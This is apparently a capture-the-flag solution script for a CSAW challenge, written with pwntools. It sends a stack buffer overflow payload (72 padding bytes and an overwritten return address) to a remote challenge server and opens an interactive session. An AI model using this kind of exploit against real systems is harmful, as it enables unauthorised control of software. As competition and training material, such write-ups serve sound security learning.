from pwn import *

r = remote('pwn.chal.csaw.io', 5000)

payload = b'A'*72 + p64(0x401172)

print(r.recv())
r.sendline(payload)
print(r.recv())
r.interactive()
